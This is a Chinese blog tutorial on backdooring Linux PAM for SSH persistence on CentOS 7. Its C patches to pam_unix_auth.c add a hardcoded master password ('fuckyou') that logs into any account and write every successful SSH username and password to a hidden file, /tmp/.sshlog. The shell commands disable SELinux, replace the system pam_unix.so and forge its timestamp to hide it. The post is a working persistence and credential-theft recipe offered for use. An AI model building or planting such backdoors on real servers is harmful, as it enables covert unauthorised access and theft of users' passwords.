---
title: "Linux PAM后门：窃取ssh密码及自定义密码登录"
date: 2020-12-12T12:43:41+08:00
draft: false
tags:
- 后门
- Linux
- PAM
series:
-
categories:
- 权限维持
---

PAM是Linux默认的ssh认证登录机制，因为他是开源的，我们可以修改源码实现自定义认证逻辑，达到记录密码、自定义密码登录、dns带外等功能。
<!--more-->

# 环境
- CentOS Linux release 7.8.2003 (Core)
- pam-1.1.8-23.el7.x86_64

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f72e4dd9-c6d9-99cc-1fc9-e024fb7383c4.png)

centos需要关闭selinux，临时关闭`setenforce 0`。永久关闭需要修改`/etc/selinux/config`，将其中SELINUX设置为disabled。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ef43bd73-ba67-5cea-477e-998a635eea11.png)

# 自定义ssh密码
查看PAM版本`rpm -qa|grep pam`

下载对应源码:http://www.linux-pam.org/library/

```
wget http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz
tar zxvf Linux-PAM-1.1.8.tar.gz
```

安装gcc编译器和flex库

```
yum install gcc flex flex-devel -y
```

修改`Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c`源码实现自定义密码认证
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/adf5e1bd-40ba-db85-b278-5cffa3cc012d.png)

```c
/* verify the password of this user */
retval = _unix_verify_password(pamh, name, p, ctrl);
if(strcmp("fuckyou",p)==0){return PAM_SUCCESS;}
name = p = NULL;
```

编译生成so文件

```
cd Linux-PAM-1.1.8
./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr
make
```

生成的恶意认证so路径在`./modules/pam_unix/.libs/pam_unix.so`。用它来替换系统自带的pam_unix.so。


因为系统不同位数不同，pam_unix.so的路径也不一样，尽量用find找一下。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ef2150a2-e47a-2176-0a86-e5c5ea45a3a9.png)

然后替换，注意先备份，万一恶意的so文件不可用就GG了。

```
cp /usr/lib64/security/pam_unix.so /tmp/pam_unix.so.bak
cp /root/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/pam_unix.so
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f694ecde-ce2b-f39d-432d-e37dbe9b72db.png)

此时先别急着断开ssh，先试一下能不能用我们设置的`fuckyou`密码登录。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/b688494c-9801-6057-ae13-1193565b2b50.png)

成功登录，后门也就留好了。为了隐蔽，修改下pam_unix.so的时间戳。

```
touch pam_unix.so -r pam_umask.so
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/97c65717-cca6-f537-d5c4-2ca848b56c43.png)

# 记录密码
同样编辑`modules/pam_unix/pam_unix_auth.c`文件

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/d3d0be0a-87ff-f63c-f804-db96d8e0ee80.png)

```c
if(retval == PAM_SUCCESS){
    FILE * fp;
    fp = fopen("/tmp/.sshlog", "a");
    fprintf(fp, "%s : %s\n", name, p);
    fclose(fp);
}
```
ssh密码会被记录到/tmp/.sshlog中。编译并替换so

```bash
cd Linux-PAM-1.1.8
make clean && make
cp /root/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/pam_unix.so
```

此时登录ssh会记录密码
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/086a42af-396d-9035-155b-e3d7063b6769.png)


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**